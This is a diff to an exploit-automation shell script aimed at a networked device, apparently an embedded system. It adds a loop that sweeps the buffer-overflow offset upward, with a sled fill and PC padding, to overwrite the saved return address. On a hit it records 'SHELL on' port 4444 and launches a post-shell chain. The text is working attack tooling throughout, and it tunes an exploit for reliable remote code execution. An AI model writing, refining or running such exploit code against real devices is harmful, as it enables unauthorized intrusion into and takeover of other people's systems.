@@ -103,9 +103,12 @@ sleep "$GUARD_GAP"
 # state before the shot: a crash mid-fire must not produce a second payload
 echo "fired $ip $(date '+%Y-%m-%d %H:%M:%S')" > "$STATE"
 
-out="$( "$PY" "$GUARD" guard --host "$ip" --mac "$MAC" --addr "$ADDR" --offset "$OFFSET" \
+shot() { # shot <offset> — one guarded fire at the current addr
+  "$PY" "$GUARD" guard --host "$ip" --mac "$MAC" --addr "$ADDR" --offset "$1" \
         --count 1 --sledfill --padpc 1 --pcround 0x1000 \
-        --guard-deadline 0 --guard-gap "$GUARD_GAP" 2>&1 )"
+        --guard-deadline 0 --guard-gap "$GUARD_GAP" 2>&1
+}
+out="$(shot "$OFFSET")"
 rc=$?
 printf '%s\n' "$out" >> "$LOG"
 [ -t 1 ] && printf '%s\n' "$out"
@@ -131,6 +134,28 @@ case "$out" in
     exit 1
     ;;
 esac
+
+# OFFSET sweep first: 1060 is borrowed from the C660, a different SoC. A too-short offset
+# never overwrites the saved RA, which is exactly the "no shell, port closed, no crash"
+# signature we keep getting. Step upward; the address sweep below re-derives the stack.
+OFF_STEP="${OFF_STEP:-16}"; OFF_N="${OFF_N:-16}"
+off=$OFFSET; i=0
+while [ "$i" -lt "$OFF_N" ]; do
+  off=$((off + OFF_STEP)); i=$((i + 1))
+  sleep "$GUARD_GAP"
+  now_ip="$(resolve_ip)"; [ -n "$now_ip" ] && ip="$now_ip"
+  log "offset sweep $i/$OFF_N -> $off"
+  out="$(shot "$off")"
+  printf '%s\n' "$out" >> "$LOG"
+  case "$out" in
+    *"SHELL on"*)
+      log "SHELL on $ip:4444 at offset $off — running the post-shell chain"
+      echo "shell $ip $off $(date '+%Y-%m-%d %H:%M:%S')" > "$STATE"
+      emit shell "{\"ip\":\"$ip\",\"offset\":$off,\"outcome\":\"shell\"}"
+      "$POSTSHELL" "$ip" && exit 0
+      ;;
+  esac
+done
 
 log "no shell at $ADDR — DECODE-BUFFER zone; sweeping to re-derive this boot's address"
 OUTCOME_TS=$(date +%s); LAT=$((OUTCOME_TS - FIRE_TS))
